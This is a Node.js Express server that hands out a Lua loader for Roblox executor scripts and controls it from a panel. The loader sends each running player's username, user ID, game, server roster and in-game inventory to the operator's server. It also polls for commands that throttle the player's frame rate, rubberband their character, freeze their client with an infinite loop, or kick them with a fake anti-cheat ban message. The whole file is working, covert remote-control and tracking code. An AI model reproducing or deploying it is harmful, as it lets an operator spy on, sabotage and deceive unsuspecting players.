const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const players = new Map();

app.get('/loader.lua', (req, res) => {
    const SERVER_BASE = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const loader = `--[[ Panel Client v3 ]]--
local BASE = "${SERVER_BASE}"
local KEY  = "xenooooo"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local genv = (getgenv and getgenv()) or _G or {}
local function resolveRequest()
    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end
if not request then return end

local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"

local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    return info and info.Name or "Unknown Game"
end

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end
    local gui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
    if not gui then return list end
    local frame = safe(function() return gui:FindFirstChild("DuelsMachineSession") end)
    if not frame then return list end
    local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
    if not scroll then return list end

    for _, template in ipairs(scroll:GetChildren()) do
        if template.Name == "Template" then
            local cash, title = nil, nil
            for _, obj in ipairs(template:GetDescendants()) do
                if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
                    local text = obj.Text
                    if string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "%$") or (string.match(text, "^%d+$") and tonumber(text) > 100) then
                        cash = text
                    end
                    if not string.match(text, "^%d+$") and not string.find(text, "Template") and not string.find(text, "Cookie") and not string.find(text, "Milki") and string.len(text) > 3 then
                        if not title or string.len(text) > string.len(title) then
                            title = text
                        end
                    end
                end
            end
            if cash or title then
                list[#list+1] = { title = title or "Unknown", cash = cash or "Unknown" }
            end
        end
    end
    return list
end

local function heartbeat()
    safe(function()
        request({
            Url = BASE .. "/api/public/heartbeat",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
            Body = HttpService:JSONEncode({
                user_id = LP.UserId,
                username = LP.Name,
                display_name = LP.DisplayName,
                avatar_url = avatarUrl(),
                place_id = game.PlaceId,
                game_name = gameName(),
                job_id = game.JobId,
                executor = executorName,
                server_players = serverPlayers(),
                brainrots = collectBrainrots(),
            }),
        })
    end)
end

local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

app.post('/api/public/heartbeat', (req, res) => {
    const data = req.body;
    if (!data || !data.user_id) {
        return res.status(400).json({ error: 'Missing user_id' });
    }
    const userId = String(data.user_id);
    const existing = players.get(userId) || {};
    players.set(userId, {
        ...existing,
        ...data,
        user_id: userId,
        online: true,
        lastHeartbeat: Date.now(),
        fps_limit: existing.fps_limit || false,
        lag_n: existing.lag_n || false,
        lag_c: existing.lag_c || false,
    });
    res.json({ status: 'ok' });
});

app.get('/api/players', (req, res) => {
    const list = [];
    const now = Date.now();
    const OFFLINE_THRESHOLD = 15000; // 15 seconds

    for (const [id, p] of players.entries()) {
        const online = (now - (p.lastHeartbeat || 0)) < OFFLINE_THRESHOLD;
        if (!online) {
            // Reset all toggles when offline
            p.fps_limit = false;
            p.lag_n = false;
            p.lag_c = false;
            p._kick = false;
            p._crash = false;
        }
        // Always set online status for the response
        p.online = online;
        list.push({ ...p });
        // Update the map with reset states (if any)
        players.set(id, p);
    }
    res.json({ players: list });
});

app.get('/api/command_state', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    res.json({
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    });
});

app.post('/api/command', (req, res) => {
    const { user_id, fps_limit, lag_n, lag_c, kick, crash } = req.body;
    if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
    const userId = String(user_id);
    const p = players.get(userId);
    if (!p) return res.status(404).json({ error: 'Player not found' });
    if (fps_limit !== undefined) p.fps_limit = !!fps_limit;
    if (lag_n !== undefined) p.lag_n = !!lag_n;
    if (lag_c !== undefined) p.lag_c = !!lag_c;
    if (kick === true) p._kick = true;
    if (crash === true) p._crash = true;
    players.set(userId, p);
    res.json({ status: 'ok' });
});

app.get('/api/public/command', (req, res) => {
    const userId = req.query.user_id;
    if (!userId) return res.status(400).json({ error: 'Missing user_id' });
    const p = players.get(String(userId));
    if (!p) return res.json({ fps_limit: false, lag_n: false, lag_c: false });
    const response = {
        fps_limit: p.fps_limit || false,
        lag_n: p.lag_n || false,
        lag_c: p.lag_c || false,
    };
    if (p._kick) {
        response.kick = true;
        p._kick = false;
    }
    if (p._crash) {
        response.crash = true;
        p._crash = false;
    }
    players.set(String(userId), p);
    res.json(response);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});